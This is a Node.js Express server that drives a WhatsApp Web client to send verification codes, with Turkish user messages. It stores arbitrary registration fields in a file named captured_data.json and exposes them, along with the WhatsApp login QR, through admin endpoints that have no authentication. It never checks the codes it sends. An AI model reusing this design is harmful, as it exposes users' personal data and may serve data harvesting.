const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { Client, LocalAuth } = require('whatsapp-web.js');
const QRCode = require('qrcode');

console.log('--- BOOTSTRAP: Starting Obsidian Server ---');

const app = express();
// PORT binding is now more robust with parseInt
const PORT = parseInt(process.env.PORT || '8080', 10);

app.use(cors());
app.use(bodyParser.json());

// Log directory and captured data file - use /tmp for Cloud Run compatibility
const logDir = '/tmp/obsidian-logs';
try {
    if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
} catch (e) {
    console.error('Directory creation failed, using fallback in-memory logging.');
}
const logFile = path.join(logDir, 'captured_data.json');

// --- SYSTEM DIAGNOSTICS & STATE ---
let client = null;
let latestQR = null;
let connectionStatus = 'INITIALIZING'; 
let systemLogs = [];

const addSystemLog = (msg) => {
    const logEntry = `[${new Date().toLocaleTimeString()}] ${msg}`;
    console.log(logEntry);
    systemLogs.push(logEntry);
    if (systemLogs.length > 50) systemLogs.shift();
};

addSystemLog('System diagnostics initialized.');

// --- WHATSAPP CLIENT MANAGEMENT ---
const createClient = () => {
    addSystemLog('Creating new WhatsApp client instance...');
    
    // Check for Chrome binary existence
    const chromePath = process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome-stable';
    addSystemLog(`Checking Chrome at: ${chromePath}`);
    addSystemLog(`Chrome exists: ${fs.existsSync(chromePath)}`);

    const newClient = new Client({
        // Explicit dataPath in /tmp to avoid permission issues
        authStrategy: new LocalAuth({ dataPath: '/tmp/.wwebjs_auth' }),
        puppeteer: {
            executablePath: chromePath,
            headless: true,
            dumpio: true, 
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--hide-scrollbars',
                '--mute-audio'
            ],
        }
    });

    newClient.on('qr', async (qr) => {
        connectionStatus = 'QR_REQUIRED';
        addSystemLog('QR code generated, waiting for scan...');
        try {
            latestQR = await QRCode.toDataURL(qr);
        } catch (err) {
            addSystemLog(`QR conversion error: ${err.message}`);
        }
    });

    newClient.on('ready', () => {
        connectionStatus = 'READY';
        latestQR = null;
        addSystemLog('WhatsApp client is READY and connected!');
    });

    newClient.on('authenticated', () => {
        connectionStatus = 'AUTHENTICATING';
        addSystemLog('WhatsApp authenticated, finishing setup...');
    });

    newClient.on('auth_failure', (msg) => {
        connectionStatus = 'DISCONNECTED';
        addSystemLog(`WhatsApp auth failure: ${msg}`);
    });

    newClient.on('disconnected', (reason) => {
        connectionStatus = 'DISCONNECTED';
        addSystemLog(`WhatsApp disconnected: ${reason}`);
    });

    return newClient;
};

const initWhatsApp = async () => {
    addSystemLog('initWhatsApp procedure started...');
    try {
        if (client) {
            addSystemLog('Destroying existing client state...');
            await client.destroy().catch(e => addSystemLog(`Destroy error: ${e.message}`));
        }

        client = createClient();
        connectionStatus = 'INITIALIZING';
        
        const timeout = setTimeout(() => {
            if (connectionStatus === 'INITIALIZING') {
                addSystemLog('CRITICAL: Initialization timeout (2 mins) - marking as DISCONNECTED');
                connectionStatus = 'DISCONNECTED';
            }
        }, 120000);

        addSystemLog('Calling client.initialize()...');
        await client.initialize();
        clearTimeout(timeout);
    } catch (err) {
        addSystemLog(`Initialization Error: ${err.message}`);
        connectionStatus = 'DISCONNECTED';
    }
};

// --- API ENDPOINTS ---

// Dedicated Health Check for Cloud Run SURVIVAL
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.get('/api/admin/status', (req, res) => {
    let logs = [];
    if (fs.existsSync(logFile)) {
        try { logs = JSON.parse(fs.readFileSync(logFile, 'utf-8')); } catch (e) {}
    }
    res.json({
        status: connectionStatus,
        qr: latestQR,
        logs: logs.reverse().slice(0, 50),
        systemLogs: systemLogs
    });
});

app.post('/api/admin/restart', async (req, res) => {
    addSystemLog('Manual restart requested via Admin Panel.');
    initWhatsApp();
    res.json({ message: 'WhatsApp yeniden başlatılıyor...', status: 'success' });
});

app.post('/api/register', (req, res) => {
    const userData = req.body;
    const timestamp = new Date().toISOString();
    const entry = { timestamp, type: 'REGISTRATION', ...userData };
    
    let logs = [];
    if (fs.existsSync(logFile)) {
        try { logs = JSON.parse(fs.readFileSync(logFile, 'utf-8')); } catch (e) {}
    }
    logs.push(entry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
    
    res.json({ message: 'Kayıt başarılı.', status: 'success' });
});

app.post('/api/request-code', async (req, res) => {
    const { phone } = req.body;
    if (connectionStatus !== 'READY') {
        return res.status(503).json({ message: 'WhatsApp bağlantısı hazır değil.' });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    addSystemLog(`Sending verification code to ${phone}`);

    try {
        let formattedPhone = phone.replace(/\D/g, '');
        if (!formattedPhone.startsWith('90')) formattedPhone = '90' + (formattedPhone.startsWith('0') ? formattedPhone.substring(1) : formattedPhone);
        
        await client.sendMessage(`${formattedPhone}@c.us`, `Doğrulama kodunuz: *${code}*`);
        res.json({ message: 'Kod gönderildi.', status: 'success' });
    } catch (error) {
        addSystemLog(`SMS Error: ${error.message}`);
        res.status(500).json({ message: 'Hata oluştu.' });
    }
});

// Serve static files
app.use(express.static(path.join(__dirname, '../client/dist')));

// --- SPA & ADMIN ROUTING ---
app.get(['/admin', '/admin/*'], (req, res) => {
    res.sendFile(path.join(__dirname, '../client/dist/index.html'));
});

// Catch-all
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../client/dist/index.html'));
});

// START SERVER
app.listen(PORT, '0.0.0.0', () => {
    addSystemLog(`EXPRESS: Server listening on 0.0.0.0:${PORT}`);
    
    // LAZY INITIALIZATION: 
    // Wait 10 seconds before starting WhatsApp bridge.
    // This ensures the container is marked as "HEALTHY" by Cloud Run first.
    addSystemLog('LAZY INIT: Health check passed. Starting WhatsApp in 10s...');
    setTimeout(() => {
        addSystemLog('LAZY INIT: Starting WhatsApp bridge now!');
        initWhatsApp();
    }, 10000);
});
